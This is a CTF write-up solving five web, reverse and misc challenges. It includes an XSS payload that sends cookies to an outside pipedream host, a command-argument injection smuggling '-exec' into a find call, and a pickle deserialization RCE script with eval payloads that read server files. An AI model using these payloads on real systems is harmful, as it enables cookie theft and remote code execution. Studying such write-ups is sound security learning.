#### Table of Contents

- [Web](#web)
  - [Manual Review](#manual-review)
  - [the-code](#the-code)
  - [rundown](#rundown)
- [Reverse](#reverse)
  - [better-cat](#better-cat)
- [Misc](#misc)
  - [alien-console](#alien-console)


# <a name="web"></a> Web

## <a name="manual-review"></a> Manual Review

#### Description

>For any coffe machine issue please open a ticket at the IT support department.
>
>Flag format: ctf{sha256}
>
>Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.

### Solution

After registerig, we are prompted with a form for submitting messages. Trying `<img src onerror="alert(1)"` shows us an error, so it's a XSS. 

![image](https://user-images.githubusercontent.com/38787278/96298054-7db22680-0ffa-11eb-8f03-128bace56340.png)

Let's try to make a request with the cookies. `<img src onerror="fetch('https://aaaaaaaaaa.m.pipedream.net?q=' + btoa(document.cookies)">` is macking the bot to do a GET request to our server. The flag is in the User-Agent header:

![image](https://user-images.githubusercontent.com/38787278/96298671-82c3a580-0ffb-11eb-89d7-7bcfd2110b86.png)

Flag: ctf{ff695564fdb6943c73fa76f9ca5cdd51dd3f7510336ffa3845baa34e8d44b436}

## <a name="the-code"></a> the-code

#### Description
>Look, the code is there. Enjoy.
>
>Flag format: ctf{sha256}
>
>Goal: You receive the source code of a small web application and you have to find the vulnerability to exfiltrate the flag.

### Solution
We get the source code of the page:

```php
 <?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

if(stristr($_GET['arg'], 'php')){
    echo "nope!";
    exit;
}

if(stristr($_GET['arg'], '>')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], '$')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], '&')){
    echo "Not needed!";
    exit;
}

if(stristr($_GET['arg'], ':')){
    echo "Not needed!";
    exit;
}

echo strtoupper(base64_encode(shell_exec("find /tmp -iname ".escapeshellcmd($_GET['arg']))));

// Do not even think to add files.

```

So, the application will execute `find` in `/tmp` searching for a file with a name that we can control. The trick is that the output is base64 encoded and then transformed into uppercase, making harder to decode it.

Solution?

Go to `/flag` and get the flag. No extra checks needed, just the flag.

![image](https://user-images.githubusercontent.com/38787278/96317888-ac8ac580-1017-11eb-9682-4f82c5f24af0.png)

However...

We can achive some limited RCE because `find` supports `-exec` that will execute a given command on each file found. But again, the problem is that the output is encoded and then transformed.
A solution would be to get the output and try to lowercase each letter character with character, decode the string and check the value obtained. The thing is that for larger strings this will take a lot of time.
What I did in the end was to use `-exec` to find out what files are in `/var/www/html/` besides the `index.php`.

I used `?start&arg=* -exec find /var/www/html {} ;` as payload and I received a lot of text in response.

![image](https://user-images.githubusercontent.com/38787278/96319914-9c73e580-1019-11eb-9c39-cddb218a39cc.png)

I took the last string and I decoded it using the below script. The permutation logic is from [GeeksforGeeks](https://www.geeksforgeeks.org/permute-string-changing-case/).

```python
import base64
import string

# Function to generate permutations 
def permute(inp): 
    n = len(inp) 
   
    # Number of permutations is 2^n 
    mx = 1 << n 
   
    # Converting string to lower case 
    inp = inp.lower() 
      
    # Using all subsequences and permuting them 
    for i in range(mx): 
        # If j-th bit is set, we convert it to upper case 
        combination = [k for k in inp] 
        for j in range(n): 
            if (((i >> j) & 1) == 1): 
                combination[j] = inp[j].upper() 
   
        temp = "" 
        # Printing current combination 
        for i in combination: 
            temp += i
        
        # print only if the decoded string contains printable characters
        decoded = base64.b64decode(temp)
        decoded_set = set(decoded)
        printable_set = [ord(x) for x in set(string.printable)]
        if all(c in printable_set for c in decoded_set):
            print(decoded)

#chunk of 16 characters
input = "DG1SL2ZSYWCKL3RT"

# /var/www/html/index.php
# /var/www/html/flag

permute(input)
```

I took chunks of 16 characters, executed the script multiple times and analyzed the output. In the end I decoded `/var/www/html/index.php` and `/var/www/html/flag`.

Flag: ctf{aaf15cacfba615d51372386909c4771f0836284ad1a539bcef49201c660631ed}

## <a name="rundown"></a> rundown

#### Description
>A rundown, informally known as a pickle or the hotbox, is a situation in the game of baseball that occurs when the baserunner is stranded between two bases, also known as no-man's land, and is in jeopardy of being tagged out." ... if you stopped in the first part of the definition you are one of ours.
>
>Flag format: ctf{sha256} Goal: You have to discover a vulnerability in this simple web application and recover the flag.

### Solution
The page displays `"APIv2 @ 2020 - You think you got methods for this?"`. Moving to Burp and making a POST request to this address shows a debug error page powered by `Werkzeug`.
Reading the error we can see this:

```python
@app.route("/", methods=["POST"])

def newpost():

  picklestr = base64.urlsafe_b64decode(request.data)

  if " " in picklestr:

    return "The ' ' is blacklisted!"

  postObj = cPickle.loads(picklestr)

  return ""
```

So, we need to exploit a pickle deserialization. I had to run a copy of the endpoint locally to figure out why my attempts were not working. The field `request.data` will have the value sent in body only if the value from `Content-Type` is not supported. I changed the value to `application/testing` and now the `request.data` contained what it was in the body.

I used the next script to get a payload that I can send:

```python
import base64
import cPickle

inner_payload = ''

class RCE(object):
    def __reduce__(self):
        return (eval, (inner_payload,))

print base64.b64encode(cPickle.dumps(RCE())) # print encoded pickled instance
```

I wanted to read the source code, so I tried to do that with the inner_payload set to `"eval(open(__file__,'r').read())"`. This will read the file and evaluate the content. We use a second `eval` to raise an error so we can get the content. Normally we could have used `raise Exception(...)`, but the white space is restricted.

However, this only gave us only the first line: `'from flask import Flask, render_template, url_for, request, redirect`. That's because the code is executed line by line and having an error from the first one we can't see the second one.

We can pass that with `"eval(open(__file__,'r').read().replace('\\n','~'))"`. This will read the file, replace all new lines with `~` and evaluate the resulted string. Notice the double slash in `\\n`, we need to escape that in order to have a valid payload.

The source code after replacing `~` with new line:

```python
import cPickle
import base64
import subprocess
import re
import string

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
  return "APIv2 @ 2020 - You think you got methods for this?"

@app.route("/", methods=["POST"])
def newpost():
  picklestr = base64.urlsafe_b64decode(request.data)
  if " " in picklestr: 
    return "The \' \' is blacklisted!"
  postObj = cPickle.loads(picklestr)
  return ""


if __name__ == "__main__":
    app.run(host = "0.0.0.0", debug=True)
'))
```

The flag is not here. Let's list the files in the application's directory. We can do that with `"eval('~'.join(__import__('os').listdir('.')))"`. This gives us `SyntaxError: ('invalid syntax', ('&lt;string&gt;', 1, 1, '.profile~.bashrc~.bash_logout~flag~app.py'))`. Reading the `flag` file actually gives us the flag.

Final inner payload: `"eval(open('flag','r').read())"`

![image](https://user-images.githubusercontent.com/38787278/96352571-bd494300-10cc-11eb-9d5a-dc305f73db00.png)

Flag: ctf{f94f7baf771dd04b5a9de97bceba8fc120395c04f10a26b90a4c35c96d48b0bb}

# <a name="reverse"></a> Reverse

## <a name="better-cat"></a> better-cat

#### Description
>You might need to look for a certain password.
>
>Flag format: ctf{sha256}
>
>Goal: In this challenge you have to obtain the password string or flag from the binary file.

### Solution
We get a binary, running `cat` on it gives us some readable text, but still garbage. Running `strings` on it gives us the flag.

![image](https://user-images.githubusercontent.com/38787278/96299472-cc60c000-0ffc-11eb-85ce-5e64f54a7b67.png)

Copy the string, remove the new lines and the ending `H` and we get the flag.

Flag: ctf{a818778ec7a9fc1988724ae3700b42e998eb09450eab7f1236e53bfdcd923878}

# <a name="misc"></a> Misc

## <a name="alien-console"></a> alien-console

#### Description
>You might not understand at first.
>
>Flag format: ctf{sha256}
>
>Goal: You have to connect to the service using telnet/netcat and find a way to recover the encoded message.

### Solution

After connecting to the server we are asked to provide an input and we receive a string in hex in return.

![image](https://user-images.githubusercontent.com/38787278/96354295-c4c51800-10dd-11eb-97a9-e0cc08e70597.png)

After playing a little with it I noticed that the output is not a hash because providing `aaaa` instead of `aaa` keeps the first 6 characters the same. I supposed that the given string was the flag encoded and the input we provided is the key (or flag is key and input is encoded).

However, trying `ctf{` gives us `0000000004040406555c5c0701565d035351065c575c52075c5c555007010404065d56575653500406045503575352545c0106555707520606570653545c56060406510118`. So, if the letter is right, two zeros will be in that position.

I tried to find how the encoding works, but I couldn't. What I did in the end was to make a request for each possible character in the flag `a-z0-9{}`, search for occurrences of `00` and build the flag character by character.

```python
from pwn import *
import string

ip = '34.89.159.150'
port = 32653

text_length = 69
characters = string.ascii_lowercase + string.digits + '{}' # all possible characters
flag = ['~' for x in range(0,69)]

for char in characters:
    con = remote(ip, port)
    mes = con.recv()

    con.sendline(bytes(char, 'utf-8') * text_length)
    sleep(1)

    encoded_flag = con.recv().split(b'\r\n')[1] # get only the hex string
    encoded_flag = [encoded_flag[x:x+2] for x in range(0, len(encoded_flag), 2)] # make list of two characters

    for i in range(0,69):
        if encoded_flag[i] == b'00':
            flag[i] = char

    con.close()
    print(''.join(flag))

```

![image](https://user-images.githubusercontent.com/38787278/96354408-ea065600-10de-11eb-8359-b5e9b7eee520.png)

Flag: ctf{aaac099bd38f64c9297b9905bdaac832365aca0f26719dc02b7cc2c6193cac4d}
